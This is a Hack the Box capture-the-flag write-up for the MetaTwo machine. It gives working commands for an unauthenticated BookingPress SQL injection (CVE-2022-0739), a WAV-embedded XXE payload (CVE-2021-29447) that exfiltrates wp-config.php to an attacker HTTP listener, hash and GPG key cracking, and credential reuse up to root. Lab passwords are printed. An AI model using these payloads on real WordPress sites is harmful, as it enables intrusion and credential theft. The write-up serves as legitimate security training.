---
title: "HTB • MetaTwo"
tags:
  - "Easy Difficulty"
  - "Beginner"
  - "Linux"
  - "CVE"
  - "FTP"
  - "Web"
  - "WordPress"
  - "SQL Injection"
  - "XXE"
  - "Hash Cracking"
excerpt: "MetaTwo is an easy Linux machine on Hack the Box that involves SQL injection, XXE, hash cracking, and Common Vulnerabilities and Exposures (CVE). Some vulnerable or misconfigured products featured in this machine include Wordpress and Wordpress plugins."
categories:
  - "Writeups"
  - "Hack the Box Machines"
img_path: /assets/img/post/htb-machines-metatwo/
---

MetaTwo is an easy Linux machine created by [**Nauten**](https://app.hackthebox.com/users/27582) on [**Hack the Box**](https://app.hackthebox.com/machines/MetaTwo) that involves exploiting a vulnerable **Wordpress** site as an unauthenticated user with **CVE-2022-0739** to recover the credentials for an account that can login and upload media. This account is then used to exploit **CVE-2021-29447** and read the Wordpress configuration file, which contains credentials that can be used on the exposed FTP server. The FTP server stores another set of credentials which we can use to login as the user **jnelson**. This user uses a password management utility known as **PassPie** to store credentials under GPG encryption. We are able to crack the master password used to encrypt these credentials and read the password for the user **root**.

## Initial Recon

Let's first set up our environment and run a TCP port scan with [this custom nmap wrapper](https://github.com/bryanmcnulty/ctf-scripts/blob/main/recon/active/ctf-portscan.sh).

```bash
# bryan@attacker
rhost="" # replace with machine address
echo rhost=$rhost >> .env && . ./.env
ctfscan $rhost
```
{:.nolineno}

The scan reports the following ports as open:

| Port | Service | Product | Version                |
|------|---------|---------|:-----------------------|
| 21   | FTP     | ProFTPD |                        |
| 22   | SSH     | OpenSSH | 8.4p1 Debian 5+deb11u1 |
| 80   | HTTP    | nginx   | 1.18.0                 |

## Web

We get redirected to [http://metapress.htb/](http://metapress.htb/) when visiting the site on port 80 in our browser so we'll add **metapress.htb** to `/etc/hosts`{:.filepath}.

```bash
echo 'rhost=10.10.11.186' >> .env
echo 'vhost=("metapress.htb")' >> .env
. ./.env
echo -e "$rhost\\t$vhost" | sudo tee -a /etc/hosts
```
{:.nolineno}

![Home page](homepage.png)

The home page has a link pointing to [http://metapress.htb/events/](http://metapress.htb/events/) where one can supposedly signup to be notified for a launch event. 

### Booking Events

Navigating to the events page and viewing the source, we find loads of references to files in the `/wp-content/` directory which indicates that this is a **Wordpress** site. Some of these links point us to the CSS and javascript source of a plugin which can be identified by the name **bookingpress-appointment-booking**. The files referenced in the plugin folder are marked with the query string `ver=1.0.10`, meaning the plugin version is likely **1.0.10**.

#### CVE-2022-0739

After some research, we find that the installation of the plugin **bookingpress-appointment-booking** on the target Wordpress site is vulnerable to **CVE-2022-0739**. The [WPScan Wordpress plugin vulnerability database](https://wpscan.com/plugins) has a page dedicated to this vulnerability with an insightful description:

> The plugin fails to properly sanitize user supplied POST data before it is used in a dynamically constructed SQL query via the bookingpress_front_get_category_services AJAX action (available to unauthenticated users), leading to an unauthenticated SQL Injection

Since this vulnerability can be exploited by unauthenticated users, it provides the opportunity to extract vital information from the database such as credentials.

##### Exploitation

There is a detailed proof-of-concept for the vulnerability on the WPScan page that uses `curl`. We just need to replace the `_wpnonce` parameter with a nonce from the target booking form.

```bash
nonce="6811748a6e" # Here's a nonce I found in /events/
curl -s "http://$vhost/wp-admin/admin-ajax.php" \
  --data "action=bookingpress_front_get_category_services&_wpnonce=$nonce&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -"
```
{:.nolineno}

We get some JSON in response with what appears to be the actual version of the database, meaning the exploit worked. Now to get some more important data, we fetch the usernames and hashes from the **wp_users** table.

```bash
curl -s "http://$vhost/wp-admin/admin-ajax.php" \
  --data "action=bookingpress_front_get_category_services&_wpnonce=$nonce&category_id=33&total_service=-1) UNION ALL SELECT group_concat(user_pass),group_concat(user_login),0,1,2,3,4,5,6 FROM wp_users-- -"
```
{:.nolineno}

We are able to extract two user entries.

| Username | Hash                               |
|----------|:-----------------------------------|
| admin    | $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. |
| manager  | $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 |

Let's try to crack these hashes with [John the Ripper](https://github.com/openwall/john)

```text
admin:$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
manager:$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
```
{:file="hashes.txt"}

```bash
john --wordlist=$rockyou_path ./hashes.txt
```
{:.nolineno}

Using the classic rockyou.txt wordlist, we are able to recover the password **partylikearockstar** for the user **manager**. With these credentials we can authenticate on the website at [/wp-login.php](http://metapress.htb/wp-login.php).

### Wordpress

Since we were able to find one piece of outdated software, it wouldn't unusual for another vulnerable product to be present. For starters we could find the Wordpress core version by looking for the meta generator tag in the HTML source, or just visiting the about page now that we have a valid account. 

![Wordpress about page](manager-about.png)

**Wordpress 5.6.2** is pretty outdated with dozens of vulnerabilities listed on the WPScan website. One in particular, tracked as **CVE-2021-29447**, seems like it could help us as long as PHP 8 is in use.

#### CVE-2021-29447

The vulnerability in question involves XXE, which could enable us to read local files. We'll use info from [this GitHub repository](https://github.com/motikan2010/CVE-2021-29447) to successfully exploit the vulnerability.

First we create the exploit file to upload:
```bash
lhost="10.10.14.10" # listener host
lport_web="80" # The port we'll serve the .dtd file on (HTTP)
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"\"http://$lhost:$lport_web/xxe.dtd\""'>%remote;%init;%trick;]>\x00' > upload.wav
```
{:.nolineno}

Now we'll look for a file to read. The most useful for our purpose might be the main Wordpress configuration since it usually contains database credentials or other goodies. we can find it at `../wp-config.php`{:.filepath} since the exploit is evaluated in the `/wp-admin/`{:.filepath} folder.

Serve the payload that will read the Wordpress config:
```bash
file="file:///proc/self/cwd/../wp-config.php" # This is just '../wp-config.php'
echo -en '<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource='"$file"'"><!ENTITY % init "<!ENTITY &#37; trick SYSTEM '"'http://$lhost:$lport_web/?f=%file;'"'>">' > xxe.dtd
python3 -m http.server --bind $lhost $lport_web
```

Finally, we upload the target file, `upload.wav`{:.filepath} to the media library.

![Media library upload](upload.png)

We may get an error, but it doesn't matter because we got a promising callback. Back in our web server log we get the compressed and encoded file in the query string. Let's copy that to a file and decode it.

```text
jVVZU/JKEH2+VvkfhhKMoARUQBARAoRNIEDCpgUhIRMSzEYyYVP87TdBBD71LvAANdNzTs/p6dMPaUMyTk9CgQBgJAg0ToVAFwFy/gsc4njOgkDUTdDVTaFhQssCgdDpiQBFWYMXAMtn2TpRI7ErgPGKPsGAP3l68glXW9HN6gHEtqC5Rf9+vk2Trf9x3uAsa+Ek8eN8g6DpLtXKuxix2ygxyzDCzMwteoX28088SbfQr2mUKJpxIRR9zClu1PHZ/FcWOYkzLYgA0t0LAVkDYxNySNYmh0ydHwVa+A+GXIlo0eSWxEZiXOUjxxSu+gcaXVE45ECtDIiDvK5hCIwlTps4S5JsAVl0qQXd5tEvPFS1SjDbmnwR7LcLNFsjmRK1VUtEBlzu7nmIYBr7kqgQcYZbdFxC/C9xrvRuXKLep1lZzhRWVdaI1m7q88ov0V8KO7T4fyFnCXr/qEK/7NN01dkWOcURa6/hWeby9AQEAGE7z1dD8tgpjK6BtibPbAie4MoCnCYAmlOQhW8jM5asjSG4wWN42F04VpJoMyX2iew7PF8fLO159tpFKkDElhQZXV4ZC9iIyIF1Uh2948/3vYy/2WoWeq+51kq524zMXqeYugXa4+WtmsazoftvN6HJXLtFssdM2NIre/18eMBfj20jGbkb9Ts2F6qUZr5AvE3EJoMwv9DJ7n3imnxOSAOzq3RmvnIzFjPEt9SA832jqFLFIplny/XDVbDKpbrMcY3I+mGCxxpDNFrL80dB2JCk7IvEfRWtNRve1KYFWUba2bl2WerNB+/v5GXhI/c2e+qtvlHUqXqO/FMpjFZh3vR6qfBUTg4Tg8Doo1iHHqOXyc+7fERNkEIqL1zgZnD2NlxfFNL+O3VZb08S8RhqUndU9BvFViGaqDJHFC9JJjsZh65qZ34hKr6UAmgSDcsik36e49HuMjVSMnNvcF4KPHzchwfWRng4ryXxq2V4/dF6vPXk/6UWOybscdQhrJinmIhGhYqV9lKRtTrCm0lOnXaHdsV8Za+DQvmCnrYooftCn3/oqlwaTju59E2wnC7j/1iL/VWwyItID289KV+6VNaNmvE66fP6Kh6cKkN5UFts+kD4qKfOhxWrPKr5CxWmQnbKflA/q1OyUBZTv9biD6Uw3Gqf55qZckuRAJWMcpbSvyzM4s2uBOn6Uoh14Nlm4cnOrqRNJzF9ol+ZojX39SPR60K8muKrRy61bZrDKNj7FeNaHnAaWpSX+K6RvFsfZD8XQQpgC4PF/gAqOHNFgHOo6AY0rfsjYAHy9mTiuqqqC3DXq4qsvQIJIcO6D4XcUfBpILo5CVm2YegmCnGm0/UKDO3PB2UtuA8NfW/xboPNk9l28aeVAIK3dMVG7txBkmv37kQ8SlA24Rjp5urTfh0/vgAe8AksuA82SzcIpuRI53zfTk/+Ojzl3c4VYNl8ucWyAAfYzuI2X+w0RBawjSPCuTN3tu7lGJZiC1AAoryfMiac2U5CrO6a2Y7AhV0YQWdYudPJwp0x76r/Nw==
```
{:file="wp-config.php.z.b64"}

```bash
php -r "echo zlib_decode(base64_decode('$(cat wp-config.php.z.b64)'));" | tee wp-config.php
```
{:.nolineno}

The contents of the configuration file reveal two passwords for two different services:

| Service | Username      | Password            |
|---------|---------------|:--------------------|
| MySQL   | blog          | 635Aq@TdqrCwXFUZ    |
| FTP     | metapress.htb | 9NYS_ii@FyL_p5M2NvJ |

Let's see if the FTP credentials are valid on the exposed FTP server.

```bash
ftp "ftp://metapress.htb@$rhost:21"
```
{:.nolineno}

They are! After a little bit of lag we are prompted for a password, where we enter `9NYS_ii@FyL_p5M2NvJ` and successfully login.

## FTP

There are two folders we can access: `blog`{:.filepath} and `mailer`{:.filepath}. Let's assume that the `blog`{:.filepath} folder is just the wordpress source, which probably won't help us at this point. Instead, we visit the `mailer`{:.filepath} directory, finding the file `send_email.php`{:.filepath} along with the PHPMailer library source.

We'll download and inspect the file at `mailer/send_email.php`{:.filepath} to check for any useful information.

```php
$mail->Host = "mail.metapress.htb";
$mail->SMTPAuth = true;                          
$mail->Username = "jnelson@metapress.htb";                 
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";                           
$mail->SMTPSecure = "tls";                           
$mail->Port = 587;
```
{:.nolineno}

We find a block of code that contains a password, `Cb4_JmWM8zUZWMu@Ys` associated with the username **jnelson@metapress.htb**, or just **jnelson**. At this point we feel confident that we have valid credentials to login via SSH.

```bash
pwncat-cs ssh://jnelson@$rhost # Install: `python3 -m pip install pwncat-cs`
```

The login is successful and we establish a pwncat session as **jnelson** where we can toggle the shell (CTRL+CD) and read the user flag at `/home/jnelson/user.txt`{:.filepath}.

## Remote Access

Just looking around the filesystem, we come across an unusual directory at `/home/jnelson/.passpie`{:.filepath}. It turns out, this directory is generated by a tool called `passpie` which is used to manage passwords.

### Passpie

Let's check for stored credentials by running simply `passpie` in our shell session.

| Name | Login   | Password | Comment |
|------|---------|----------|:--------|
| ssh  | jnelson | _Hidden_ |         |
| ssh  | root    | _Hidden_ |         |

It looks like the password for the root account is stored. We cannot directly export these credentials though, because they are encrypted using GPG. We might be able to crack the GPG key to recover the password depending on how weak the master password is.

#### Recover Master Password

Let's download what looks like the public and private keys from `/home/jnelson/.passpie/.keys`{:.filepath} using the `scp` command or PwnCat's `download` command. Once we have the file downloaded on our own machine, we'll separate the public and private keys.

```bash
cat .keys | grep PRIVATE -A99 > private.pem
```
{:.nolineno}

Using `gpg2john` from [John the Ripper](https://github.com/openwall/john), we generate a hash that can be properly ingested and potentially cracked from the private key file `private.pem`{:.filepath}.

```bash
gpg2john ./private.pem > passpie.john
```
{:.nolineno}

Finally, we'll try to crack the hash with [this wordlist](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt).

```bash
john --wordlist="100k-most-used-passwords-NCSC.txt" passpie.john
```
{:.nolineno}

We successfully recover the master password: **blink182**

#### Export Credentials

Now that we have the master password, we can export the root password in plain text.

```bash
# jnelson@metapress.htb (SSH)
passpie export creds.txt
```
{:.nolineno}

The file `creds.txt`{:.filepath} now contains the root password which we use to login as root using the `su` command. The root flag can be found at `/root/root.txt`{:.filepath} as usual.